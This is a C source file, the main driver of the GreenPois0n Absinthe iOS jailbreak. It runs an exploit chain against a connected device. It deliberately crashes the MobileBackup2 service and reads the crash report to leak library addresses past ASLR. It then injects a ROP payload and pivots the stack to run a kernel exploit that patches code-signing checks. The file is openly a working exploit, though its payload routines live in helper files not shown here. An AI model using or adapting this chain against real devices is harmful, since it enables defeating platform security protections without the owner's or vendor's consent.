/**
 * GreenPois0n Absinthe - absinthe.c
 * Copyright (C) 2010 Chronic-Dev Team
 * Copyright (C) 2010 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Comment this out for production build to remove all debugging strings
#define _DEBUG
#include "mb2.h"
#include "debug.h"
#include "device.h"
#include "crashreporter.h"

#ifdef WIN32
#define sleep(x) Sleep(x*1000)
#endif

int main(int argc, char* argv[]) {
	int err = 0;

	// Pass a UUID here if you want to target a single device,
	//  or NULL to select the first one it finds.
	printf("Openning device connection\n");
	device_t* device = device_create(NULL);
	if (device == NULL) {
		error("Unable to find a device to use\n");
		return -1;
	}
	device_enable_debug();

	// First we need to discover all the dylib base addresses so we can find our
	//  ROP gadgets for our payloads. We do this by crashing BackupAgent2 once,
	//  then downloading the crashreport from the crashreport service.
	info("Opening connection to MobileBackup2 service\n");
	mb2_t* mb2 = mb2_connect(device);
	if (mb2 == NULL) {
		error("Unable to open connection to MobileBackup2 service\n");
		device_free(device);
		return -1;
	}

	// The second argument here is a pointer to the crashreport_t object containing
	//  our dylib base address, as well as the state the device was in last time
	//  it crashed.
	info("Crashing MobileBackup2 exploit so we can fetch a clean crashreport\n");
	err = mb2_crash(mb2);
	if (err < 0) {
		debug("Unable to crash MobileBackup2 service\n", err);
		device_free(device);
		return -1;
	}
	mb2_free(mb2);

	info("Giving the device a moment to write the crash report...\n");
	sleep(3);

	// Here we open crashreporter so we can download the mobilebackup2 crashreport
	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
	info("Opening connection to CrashReporter service\n");
	crashreporter_t* reporter = crashreporter_connect(device);
	if (reporter == NULL) {
		error("Unable to open connection to crash reporter\n");
		device_free(device);
		return -1;
	}

	// Read in the last crash since that's probably our fault anyways. Since dylib
	//  addresses are only randomized on boot, we now have base addresses to
	//  calculate the addresses of our ROP gadgets we need.
	info("Reading in crash reports from mobile backup\n");
	crashreport_t* crash = crashreporter_last_crash(reporter);
	if (crash == NULL) {
		error("Unable to read last crash\n");
		device_free(device);
		return -1;
	}
	crashreporter_free(reporter);

	// Open and initialize a connection to MobileBackup2 service again to perform
	//  our injection exploit
	info("Opening connection to backup service\n");
	mb2 = mb2_connect(device);
	if (mb2 == NULL) {
		error("Unable to open connection to MobileBackup2 service\n");
		device_free(device);
		return -1;
	}

	// Due to Apple's new ASLR, before we can overwrite stack with our ROP payload,
	//  we're going to need to figure out where our data is being stored. Heap
	//  and stack are randomized on each execution.
	info("Injecting ROP payload and leaking it's addresss\n");
	err = mb2_inject(mb2);
	if(err < 0) {
		error("Unable to inject ROP payload or discover it's offset\n");
		device_free(device);
		return -1;
	}

	// Now that we know where our data is, and we know where all the code is, we can
	//  pivot the stack onto our ROP payload and execute our kernel vulnerability.
	info("Executing kernel exploit and patching codesign\n");
	err = mb2_exploit(mb2);
	if(err < 0) {
		error("Unable to execute kernel exploit and patch codesign\n");
		device_free(device);
		return -1;
	}

	// All done, not sure if we should clean this up yet
	info("Closing MobileBackup2 service\n");
	mb2_free(mb2);

	// If open, then close and free structures
	info("Cleaning up\n");
	if (crash) crashreport_free(crash);

	if (device) device_free(device);
	info("Done\n");
	return 0;
}
